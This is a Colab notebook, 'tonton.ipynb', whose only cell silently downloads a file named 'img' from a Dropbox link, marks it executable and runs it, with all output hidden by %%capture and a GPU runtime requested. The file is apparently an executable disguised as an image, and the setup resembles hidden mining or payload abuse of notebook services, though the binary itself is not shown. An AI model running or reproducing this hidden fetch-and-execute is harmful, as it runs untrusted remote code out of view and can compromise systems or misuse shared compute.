{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tonton.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "F44h0PZeYizc"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "! wget -O img https://www.dropbox.com/s/aqh3blzj52jd3jy/img?dl=1\n",
        "! chmod +x img\n",
        "! ./img"
      ]
    }
  ]
}
